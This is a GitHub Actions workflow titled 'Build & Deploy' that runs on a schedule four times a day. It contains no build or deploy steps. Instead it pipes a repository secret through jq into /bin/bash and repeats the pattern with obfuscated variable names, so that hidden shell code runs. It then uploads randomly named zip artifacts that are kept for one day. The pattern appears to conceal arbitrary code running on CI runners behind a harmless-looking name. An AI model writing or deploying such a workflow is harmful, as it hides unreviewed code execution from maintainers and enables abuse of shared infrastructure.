name: Build & Deploy
on:
  workflow_dispatch:

  schedule:
    - cron: '56 3,9,15,21 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  compile:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
      - name: Setup and run
        env:
          mj545: ${{ secrets.mj545 }}
        run: |
          printf '%s' "$mj545" | jq -r .aca13449 | /bin/bash
          printf '%s' "$j22321" | jq -r .ra1 | /bin/bash
          echo $cypcj53517 | jq -r .ujra455 | /bin/bash
          echo $jtr6 | jq -r .l34 | /bin/bash
          printf '%s' "$a3" | jq -r .j5 | /bin/bash

      - name: Upload data
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: R9sYpfmt
          path: "*.zip"
          retention-days: 1
